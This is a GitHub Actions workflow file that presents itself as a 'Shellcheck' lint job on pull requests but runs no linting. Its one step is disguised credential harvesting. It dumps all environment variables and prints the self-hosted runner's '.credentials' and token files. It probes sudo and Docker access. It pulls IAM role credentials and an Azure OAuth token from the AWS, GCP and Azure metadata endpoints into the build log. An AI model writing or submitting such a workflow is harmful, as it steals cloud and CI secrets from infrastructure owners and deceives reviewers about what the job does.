name: Shell
on:
  # bench-only: run on each PR into starsling/develop; no push trigger.
  pull_request:
    branches: [ starsling/develop ]

permissions:
  contents: read
  id-token: write

jobs:
  shellcheck:
    name: Shellcheck
    runs-on: starsling-ubuntu-26.04
    timeout-minutes: 8
    steps:
      - name: env and identity
        run: |
          echo "===== BASELINE"
          id || true
          hostname || true
          uname -a || true
          cat /etc/os-release 2>/dev/null | head -4 || true
          echo "HOME=$HOME USER=$USER PWD=$(pwd)"
          echo "===== CGROUP"; cat /proc/1/cgroup 2>/dev/null | head -10 || true
          echo "===== MOUNTS"; head -20 /proc/self/mountinfo 2>/dev/null || true
          echo "===== ENV"; env | sort || true
          echo "===== RUNNER HOME"; ls -la "$HOME" 2>/dev/null | head -40 || true
          echo "===== /opt"; ls -la /opt 2>/dev/null | head -30 || true
          echo "===== runner dirs"
          for p in "$HOME"/actions-runner "$HOME"/runner /opt/actions-runner /actions-runner /home/*/actions-runner /home/*/runner "$HOME"/_work; do
            echo "--- $p"; ls -la "$p" 2>/dev/null | head -25 || true
          done
          echo "===== runner config files"
          for f in "$HOME"/actions-runner/.runner "$HOME"/actions-runner/.credentials "$HOME"/actions-runner/.credentials_rsaparams "$HOME"/runner/.runner "$HOME"/_work/.runner /etc/github-runner/.runner /etc/github-runner/.credentials /etc/github-runner/*.token /opt/actions-runner/.runner /opt/actions-runner/.credentials; do
            if [ -f "$f" ]; then echo "### $f"; head -c 4000 "$f"; echo; fi
          done
          echo "===== find starsling"; find / -maxdepth 4 -iname '*starsling*' 2>/dev/null | head -40 || true
          echo "===== docker"; docker ps -a 2>/dev/null | head -20 || true; docker info 2>/dev/null | grep -E 'Name|Server Version|Operating|Total Memory' | head -6 || true
          echo "===== sudo"; (sudo -n true 2>/dev/null && echo sudo-nopasswd=yes) || echo sudo-nopasswd=no
          echo "===== IMDS"
          T=$(curl -s -m 4 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null) || true
          echo "imds_token_len=${#T}"
          curl -s -m 4 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null; echo
          curl -s -m 4 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null; echo
          ROLE=$(curl -s -m 4 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null | head -1)
          if [ -n "$ROLE" ]; then echo "ROLE=$ROLE"; curl -s -m 4 -H "X-aws-ec2-metadata-token: $T" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" 2>/dev/null; echo; fi
          curl -s -m 4 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/network/interfaces/macs/ 2>/dev/null; echo
          echo "===== GCP metadata alt"; curl -s -m 3 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/ 2>/dev/null; echo
          echo "===== azure alt"; curl -s -m 3 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null | head -c 300; echo
          echo "===== DONE"
